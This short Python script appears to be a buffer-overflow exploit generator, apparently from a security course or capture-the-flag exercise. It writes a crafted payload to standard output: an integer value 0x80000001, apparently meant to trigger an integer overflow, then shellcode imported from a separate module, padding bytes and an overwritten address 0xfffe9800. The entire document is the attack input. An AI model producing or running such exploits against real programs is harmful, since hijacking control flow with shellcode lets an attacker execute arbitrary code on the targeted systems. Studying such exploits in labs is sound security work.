from shellcode import shellcode
from struct import pack
import sys

sys.stdout.buffer.write(pack('<I', 0x80000001)+ shellcode +('\x12'*21).encode('ASCII') + pack("<I", 0xfffe9800))